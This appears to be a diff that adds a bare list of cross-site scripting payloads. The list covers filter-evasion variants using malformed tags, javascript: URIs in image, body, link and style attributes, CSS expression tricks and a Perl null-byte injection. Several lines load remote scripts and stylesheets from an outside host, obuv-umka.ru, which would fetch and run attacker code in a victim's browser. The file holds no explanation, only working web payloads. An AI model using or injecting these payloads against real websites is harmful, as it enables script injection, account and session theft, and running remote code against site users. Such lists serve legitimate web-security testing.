@@ -1,0 +1,30 @@
+perl -e 'print "<IMG SRC=java\0script:location.hash=10>";' > out
+<IMG SRC=" &#14;  javascript:location.hash=10;">
+<SCRIPT/XSS SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<BODY onload!#%&()*~+-_.,:;?@[/|\]^`=location.hash=10>
+<SCRIPT/SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT>
+<<SCRIPT>location.hash=10;//<</SCRIPT>
+<SCRIPT SRC=http://obuv-umka.ru/js/xss.js?< B >
+<IMG SRC="javascript:location.hash=10"
+<iframe src=http://www.obuv-umka.ru/js/xss.html <
+\";location.hash=10;//
+</script><script>location.hash=10;</script>
+</TITLE><SCRIPT>location.hash=10;</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:location.hash=10;">
+<BODY BACKGROUND="javascript:location.hash=10">
+<IMG DYNSRC="javascript:location.hash=10">
+<IMG LOWSRC="javascript:location.hash=10">
+<STYLE>li {list-style-image: url("javascript:location.hash=10");}</STYLE><UL><LI>XSS</br>
+<BODY ONLOAD=location.hash=10>
+<BGSOUND SRC="javascript:location.hash=10;">
+<BR SIZE="&{location.hash=10}">
+<LINK REL="stylesheet" HREF="javascript:location.hash=10;">
+<LINK REL="stylesheet" HREF="http://www.obuv-umka.ru/js/xss.css">
+<STYLE>@import'http://www.obuv-umka.ru/js/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://www.obuv-umka.ru/js/xss.css>; REL=stylesheet">
+<STYLE>@im\port'\ja\vasc\ript:location.hash=10';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(location.hash=10)">
+<STYLE>.XSS{background-image:url("javascript:location.hash=10");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:location.hash=10")}</STYLE>
+<XSS STYLE="xss:expression(location.hash=10)">
+¼script¾location.hash=10¼/script¾
